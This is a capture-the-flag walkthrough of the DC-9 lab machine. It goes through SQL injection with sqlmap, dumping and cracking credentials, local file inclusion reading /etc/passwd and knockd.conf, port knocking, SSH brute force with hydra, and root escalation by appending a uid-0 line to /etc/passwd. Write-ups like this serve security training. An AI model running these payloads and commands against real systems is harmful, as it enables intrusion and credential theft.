root@kali ~/D/C/DC-9# nmap -sS -T4 -A -p- 10.0.0.25

PORT   STATE    SERVICE
22/tcp filtered ssh
80/tcp open     http

SSH is filtered, gonna need to use a proxy or reverse shell from the site hosted on the web server.

Going to http://10.0.0.25 have a couple of pages. We have a login page and a search page. When passing "' OR 1=1 #" in the search query we can see all of the available results. This means http://10.0.0.25/search.php is vulnerable to SQLi.
This means we are going to need to use 'sqlmap'. Since the search doesn't send a GET request and takes arguments from the url, we are going to need to download the results.php using Burp Suite and use 'sqlmap' on it.

root@kali ~/D/C/DC-9# sqlmap -r results.txt --dbs

available databases [3]:
[*] information_schema
[*] Staff
[*] users

root@kali ~/D/C/DC-9# sqlmap -r results.txt -D users --tables --columns --dump

Returns usernames and password. We can add them to the files users.txt and password.txt.

root@kali ~/D/C/DC-9# sqlmap -r results.txt -D Staff -T Users --columns --dump

+--------+----------------------------------+----------+
| UserID | Password                         | Username |
+--------+----------------------------------+----------+
| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |
+--------+----------------------------------+----------+

Hash decode: transorbital1

We now have the creds in order to be able to log into the site.
After logging in we can see that http://10.0.0.25/manage.php shows and error: "File does not exist". This might be an indicator that this page is vulnerable to LFI (Local File Inclusion).

http://10.0.0.25/manage.php?file=../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin sshd:x:105:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false marym:x:1001:1001:Mary Moe:/home/marym:/bin/bash julied:x:1002:1002:Julie Dooley:/home/julied:/bin/bash fredf:x:1003:1003:Fred Flintstone:/home/fredf:/bin/bash barneyr:x:1004:1004:Barney Rubble:/home/barneyr:/bin/bash tomc:x:1005:1005:Tom Cat:/home/tomc:/bin/bash jerrym:x:1006:1006:Jerry Mouse:/home/jerrym:/bin/bash wilmaf:x:1007:1007:Wilma Flintstone:/home/wilmaf:/bin/bash bettyr:x:1008:1008:Betty Rubble:/home/bettyr:/bin/bash chandlerb:x:1009:1009:Chandler Bing:/home/chandlerb:/bin/bash joeyt:x:1010:1010:Joey Tribbiani:/home/joeyt:/bin/bash rachelg:x:1011:1011:Rachel Green:/home/rachelg:/bin/bash rossg:x:1012:1012:Ross Geller:/home/rossg:/bin/bash monicag:x:1013:1013:Monica Geller:/home/monicag:/bin/bash phoebeb:x:1014:1014:Phoebe Buffay:/home/phoebeb:/bin/bash scoots:x:1015:1015:Scooter McScoots:/home/scoots:/bin/bash janitor:x:1016:1016:Donald Trump:/home/janitor:/bin/bash janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash 

Now at this point I got a little stuck I didn't know what files to read. So I traced my steps and saw that SSH is filtered, this might be a sign that we should use Port Knocking (A method of externally opening ports on a firewall by generating a connection attempt on a set of prespecified port. The primary purpose of Port Knocking is to prevent an attacker from scanning a system for potentially exploitable services by doing a port scan, because unless the attacker sends the correct knock sequence, the protected ports will appear closed, our in our case filtered). 
Turns out when Port Knocking is enabled, it must have a config file at /etc/knockd.conf ----> https://www.tecmint.com/port-knocking-to-secure-ssh/

http://10.0.0.25/manage.php?file=../../../../../../etc/knockd.conf:

[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn 

We can use the command 'knock' that allows use to Port Knock ports on the machine.

root@kali ~/D/C/DC-9# knock 10.0.0.25 7469 8475 9842
root@kali ~/D/C/DC-9 [SIGINT]# nmap -sS -T4 -p- 10.0.0.25

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

SSH is open :3 . We can now brute force the ssh login using the credentials we found in the SQL database. 

root@kali ~/D/C/DC-9# hydra -L users.txt -P passwords.txt ssh://10.0.0.25 -IV

[22][ssh] host: 10.0.0.25   login: chandlerb   password: UrAG0D!
[22][ssh] host: 10.0.0.25   login: joeyt   password: Passw0rd
[22][ssh] host: 10.0.0.25   login: janitor   password: Ilovepeepee

I logged in as the user 'joeyt' and found nothing in his home directory, he also not able to run sudo on the machine. The user 'chandlerb' was the same story. But the user 'janitor' had a secret directory for Putin that held a couple of passwords.

janitor/.secrets-for-putin/passwords-found-on-post-it-notes.txt:

BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts

One of this passwords must be for another user we found earlier.

root@kali ~/D/C/DC-9# hydra -L users.txt -P passwords-found-on-post-it-notes.txt ssh://10.0.0.25 -IV

[22][ssh] host: 10.0.0.25   login: fredf   password: B4-Tru3-001

fredf@dc-9:~$ sudo -l

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test

The user 'fredf' can run the file /opt/devstuff/dist/test/test as root.

fredf@dc-9:~$ /opt/devstuff/dist/test/test
Usage: python test.py read append
fredf@dc-9:/opt/devstuff/dist/test$ find / -name test.py 2> /dev/null
/usr/lib/python3/dist-packages/setuptools/command/test.py

After running the command /opt/devstuff/dist/test/test it spouts out the syntax for the command test.py. After finding and reading it, we can find out that the command adds (apeands) the content of the first file onto the second file, the same as '>>'.

e.g. test1.txt = "Hello World", test2.txt = "Linux is better then Windows"
/opt/devstuff/dist/test/test test1.txt test2.txt
test2.txt = Hello World\nLinux is better then Windows

I played with it a bit and we can't add our own exploit to /opt/devstuff/dist/test/test. We also can't add some malicious python code to 'test.py'.

I searched online for "linux edit files for privilege escalation" and found this article that shows we can add a new line to the /etc/passwd file and thus create a new user with root permissions.

By coping the line of the root user in /etc/passwd and adding a generated password using openssel, we can add a new line to /etc/passwd and thus add a new user with root permissions.

root@kali ~/D/C/DC-9# openssl passwd newpassword
Warning: truncating password to 8 characters
qhg/ezNoZ/ApE

newroot:qhg/ezNoZ/ApE:0:0:root:/root:/bin/bash

fredf@dc-9:/tmp/expliot$ echo 'newroot:qhg/ezNoZ/ApE:0:0:root:/root:/bin/bash' > newRootUser.txt
fredf@dc-9:/tmp/expliot$ cat newRootUser.txt 
newroot:qhg/ezNoZ/ApE:0:0:root:/root:/bin/bash
fredf@dc-9:/tmp/expliot$ sudo /opt/devstuff/dist/test/test newRootUser.txt /etc/passwd
fredf@dc-9:/tmp/expliot$ su newroot
Password: newpassword
root@dc-9:/tmp/expliot# whoami
root

theflag.txt:



███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
                                                                             
Congratulations - you have done well to get to this point.

Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
who have taken the time to complete the various DC challenges.

I also want to send out a big thank you to the various members of @m0tl3ycr3w .

They are an inspirational bunch of fellows.

Sure, they might smell a bit, but...just kidding.  :-)

Sadly, all things must come to an end, and this will be the last ever
challenge in the DC series.

So long, and thanks for all the fish.